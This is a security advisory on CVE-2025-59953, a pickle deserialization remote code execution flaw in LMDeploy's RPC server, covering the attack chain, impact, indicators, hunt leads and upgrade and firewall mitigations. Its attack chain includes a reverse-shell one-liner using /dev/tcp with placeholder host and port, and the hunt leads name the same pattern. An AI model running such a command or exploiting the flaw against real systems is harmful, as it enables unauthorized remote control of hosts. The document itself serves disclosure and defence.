---
title: Remote Code Execution in LMDeploy via Insecure Pickle Deserialization
slug: 2026-09-lmdeploy-rce
description: LMDeploy versions 0.9.1 through 0.10.1 are vulnerable to remote code execution due to insecure pickle deserialization within the AsyncRPCServer component, allowing attackers to execute arbitrary system commands.
date: "2026-09-16T19:07:09Z"
type: advisory
types:
  - advisory
severities:
  - critical
cpes:
  - cpe:2.3:a:interlm:lmdeploy:0.9.1:*:*:*:*:*:*:*
  - cpe:2.3:a:interlm:lmdeploy:0.10.1:*:*:*:*:*:*:*
vendors:
  - InterLM
products:
  - lmdeploy (0.9.1 - 0.10.1)
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
    evidence: Once the victim starts the RPC server, an attacker on the network can gain arbitrary code execution by scanning and finding the victim’s service.
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059.003
    technique_name: 'Command and Scripting Interpreter: Bash'
    evidence: Attacker modifies AsyncRPCClient and send a request containing malicious pickle dump data to let the victim execute command 'bash -c ...'
    confidence_band: high
cves:
  - id: CVE-2025-59953
    cvss: 9.8
references:
  - https://github.com/advisories/GHSA-5h8j-6crg-7rmw
  - https://nvd.nist.gov/vuln/detail/CVE-2025-59953
iocs:
  - type: ip
    value: 202.112.47.27
ioc_counts:
  ip: 1
action_plan:
  priority: immediate_escalation
  owners:
    - IT Operations
    - Security Operations
  immediate_actions:
    - action: Upgrade LMDeploy to 0.10.2 or higher.
      owner: IT Operations
      due: 24h
      evidence: Maintainer assessment states 0.10.2 mitigates the remote attack vector.
  hunt_leads:
    - lead: Search for reverse shell artifacts (e.g., bash -c, /dev/tcp) spawned by lmdeploy or python processes.
      technique_id: T1059.003
      data_needed:
        - Process creation logs with command lines
      priority: high
      confidence: high
      disposition: hunt_now
      evidence: Attacker uses pickle to execute command 'bash -c'
  mitigation_plan:
    - priority: immediate
      action: Restrict RPC port access to localhost via network configuration.
      owner: IT Operations
      addresses: CVE-2025-59953
      evidence: 0.10.2 changed binding to localhost to remove remote attack surface.
---

LMDeploy, a toolkit for compressing and deploying Large Language Models, contains a critical remote code execution vulnerability (CVE-2025-59953) affecting versions 0.9.1 through 0.10.1. The vulnerability exists within the AsyncRPCServer component, which implements an RPC mechanism using ZMQ. The server uses `pickle.loads()` to deserialize incoming RPC messages without sanitization. Because versions prior to 0.10.2 bound the RPC service to all network interfaces (`tcp://*`), a remote attacker capable of reaching the randomly assigned RPC port can submit a malicious pickle payload. Successful exploitation results in arbitrary command execution on the host machine. Version 0.10.2 addressed the remote exposure by defaulting the RPC server binding to localhost, though the underlying use of insecure pickle deserialization remains, requiring local security isolation.

## Attack Chain

1. Attacker performs network reconnaissance to identify reachable LMDeploy RPC service ports on the target machine.
2. Attacker crafts a malicious pickle payload containing an arbitrary system command, such as a reverse shell trigger (e.g., `bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'`).
3. Attacker initiates a ZMQ connection to the target RPC service port.
4. Attacker sends the crafted pickle-encoded data via the `call_and_response()` function interface.
5. The `AsyncRPCServer` receives the payload and passes it directly to `pickle.loads()`.
6. The Python interpreter deserializes the malicious object, triggering the execution of the embedded system command.
7. Attacker receives the reverse shell connection, granting full command execution capabilities on the host.

## Impact

The vulnerability allows unauthenticated remote attackers to achieve full system compromise. If the LMDeploy service is running with elevated privileges, the impact includes total control over the host machine, potential lateral movement within the network, and data exfiltration. The threat is critical for organizations deploying LMDeploy in production environments where the RPC service was inadvertently exposed to broader networks.

## Recommendation

1. Upgrade all instances of LMDeploy to version 0.10.2 or later to address the remote exposure issue.
2. For environments where upgrading is not immediately possible, implement firewall rules to restrict access to the RPC ports to authorized local processes only.
3. If LMDeploy is required to interact across network boundaries, implement external authentication and encryption layers, as the current RPC protocol lacks native access control.
4. Perform a threat hunt for unexpected network connections to LMDeploy processes using the provided C2 IP as a starting point.
